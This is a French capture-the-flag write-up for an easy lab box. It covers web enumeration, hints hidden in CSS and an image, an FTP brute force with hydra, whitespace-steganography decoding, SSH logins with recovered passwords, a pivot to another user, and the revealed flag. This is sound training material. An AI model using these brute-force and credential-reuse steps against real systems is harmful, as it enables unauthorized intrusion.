# Write-up : "Musa Troglodytarum"

**Cible :** 10.10.0.X (l'IP change à chaque redéploiement, revérifie-la)

**Objectif :** Obtenir user.txt

**Difficulté :** Easy

**Techniques :** énumération web, indice caché dans le CSS, redirection HTTP, `strings` sur une image, brute force FTP, stéganographie espaces/tabulations, réutilisation d'identifiants, pivot entre utilisateurs

**Outils :** nmap, curl, wget, strings, hydra, ftp, ssh, python3

---

## 0. Définir l'IP de la cible

```bash
ip=10.10.0.X
```
Toutes les commandes utilisent `$ip` ensuite.

---

## 1. Scan des ports

```bash
nmap -sV -p- $ip
```
Résultat : `21` (FTP), `22` (SSH), `80` (HTTP, page "It works").

---

## 2. Indice caché dans le CSS

```bash
curl -s http://$ip/assets/style.css
```
Un commentaire en bas donne la page cachée `/l3_B4n4N13r_D3s_M0nT4gN3s.php`. (La « vidéo » de la page d'accueil est un piège.)

**Faille :** info sensible dans un fichier annexe (CWE-200).

---

## 3. Suivre la page cachée

```bash
curl -i http://$ip/l3_B4n4N13r_D3s_M0nT4gN3s.php
```
`-i` = affiche les en-têtes. L'en-tête `Location:` révèle le dossier caché `/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3`.

**Faille :** chemin "secret" non protégé (CWE-425).

---

## 4. Télécharger l'image directement

> Lister le dossier renvoie une redirection 301 vers un ServerName cassé (10.10.0.10). On va donc **directement chercher le fichier** :

```bash
wget "http://$ip/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/Hot_Babe.png"
```

**Faille :** directory listing activé (CWE-548).

---

## 5. Lire le texte caché + construire la wordlist

```bash
strings Hot_Babe.png | grep -i FTP
strings Hot_Babe.png | sed -n '/One of these is the password/,$p' | tail -n +2 > passwords.txt
wc -l passwords.txt
```
→ login `banane_celeste` + ~200 mots de passe candidats dans `passwords.txt`.

**Faille :** login et mots de passe cachés dans une image (CWE-200).

---

## 6. Brute force du FTP

```bash
hydra -l banane_celeste -P passwords.txt -f -t 4 ftp://$ip
```
`-t 4` = peu de connexions en parallèle (le FTP coupe les reconnexions rapides).
> Si « too many connection errors », descends à `-t 1` :
> ```bash
> hydra -l banane_celeste -P passwords.txt -f -t 1 ftp://$ip
> ```

**Faille :** pas de protection contre le brute force (CWE-307).

---

## 7. Récupérer le fichier via FTP

```bash
wget "ftp://banane_celeste:<MDP_TROUVE>@$ip/Valerian's_Creds.txt"
mv "Valerian's_Creds.txt" creds.txt
cat -A creds.txt | head
```
`cat -A` montre les tabulations `^I` et les espaces → le fichier est de la stéganographie par espaces/tabs. (On renomme en `creds.txt` pour éviter l'apostrophe qui gêne les commandes.)

---

## 8. Décoder la stéganographie (terminal)

> CyberChef « From Binary » ne marche PAS ici : l'encodage est **1 octet par ligne** (sur les 8 derniers bits) avec des lignes séparatrices, donc un flux continu se désaligne. On utilise ce décodage :

```bash
python3 -c 'out=""
for l in open("creds.txt"):
    s=l.rstrip("\r\n")
    if len(s)>2 and set(s)<=set(" \t"):
        out+=chr(int(s.replace(" ","0").replace(chr(9),"1")[-8:],2))
print(out)'
```
→ `User: valerian` / `Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP`

**Faille :** identifiants cachés par stéganographie (CWE-311).

---

## 9. Connexion SSH en valerian

```bash
ssh valerian@$ip
```
(mot de passe : `T4k_t4k_S0lide_Dyn0_int0_Cr1mP`)

> Si « REMOTE HOST IDENTIFICATION HAS CHANGED » (box redéployée), supprime l'ancienne clé puis reconnecte-toi :
> ```bash
> ssh-keygen -f /root/.ssh/known_hosts -R $ip
> ```

Le message d'accueil parle d'une « s3cr3t hiding place ».

**Faille :** réutilisation d'identifiants exposés (CWE-522).

---

## 10. Trouver la cachette

```bash
find / -iname "*s3cr3t*" 2>/dev/null
cat /usr/games/s3cr3t/.msg_fr0m_v4l3r14n
```
→ mot de passe de gabriel : `ca_serait_jamais_arrive_en_haskell`

**Faille :** mot de passe en clair dans un fichier (CWE-256).

---

## 11. Devenir gabriel et lire le flag

```bash
su gabriel
cat ~/user.txt
```
→ `EPI{l3_7R0nC_3S7_3N_R34Li73_un_PS3ud0_7r0NC_InCR0ya8Le}`

---

## Résumé des étapes

1. `nmap` : 21/22/80.
2. `style.css` : page `.php` cachée.
3. `curl -i` sur la page : redirection (302) vers un dossier caché.
4. `wget` direct de `Hot_Babe.png`.
5. `strings` : login FTP + wordlist.
6. `hydra -t 4` : le mot de passe FTP.
7. FTP : `Valerian's_Creds.txt` (espaces/tabs) → renommé `creds.txt`.
8. décodage terminal : mot de passe de valerian.
9. `ssh valerian`, message caché : mot de passe de gabriel.
10. `su gabriel` : `user.txt`.

## Failles exploitées

| # | Faille | CWE |
|---|--------|-----|
| 1 | Indice dans un commentaire CSS | CWE-200 |
| 2 | Chemin secret non protégé | CWE-425 |
| 3 | Directory listing activé | CWE-548 |
| 4 | Login et wordlist cachés dans une image | CWE-200 |
| 5 | Pas d'anti-brute-force FTP | CWE-307 |
| 6 | Whitespace stego | CWE-311 |
| 7 | Réutilisation d'identifiants | CWE-522 |
| 8 | Mot de passe en clair dans un fichier | CWE-256 |

## À retenir
- Toujours lire les fichiers annexes (CSS, commentaires) : l'indice y était.
- Un `curl` qui n'affiche rien = une redirection, refais avec `-i`.
- `strings` révèle le texte caché dans une image.
- Stégano espaces/tabs ici = **décodage terminal** (CyberChef ne suffit pas pour ce format).
- La « vidéo » est un piège volontaire.
